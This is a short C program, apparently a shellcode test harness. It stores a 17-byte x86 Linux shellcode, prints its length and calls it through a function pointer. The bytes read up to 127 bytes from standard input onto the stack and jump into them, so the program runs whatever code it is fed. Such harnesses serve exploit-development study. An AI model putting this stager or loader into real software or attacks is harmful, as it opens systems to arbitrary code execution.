#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]){

    // Shell code
    unsigned char shell_code[] = \
		"\x6a\x7f\x5a\x83\xec\x7f\x89\xe1\x31\xdb\x6a\x03\x58\xcd\x80\x51\xc3";
    
    // Shell code length
    printf("Shellcode Length: %d\n", strlen(shell_code));

    // Get a function pointer to the shell code
    void (*shellCodePtr)() = (void(*)())shell_code;

    // Call the shell code
    shellCodePtr();

    return 0;
}	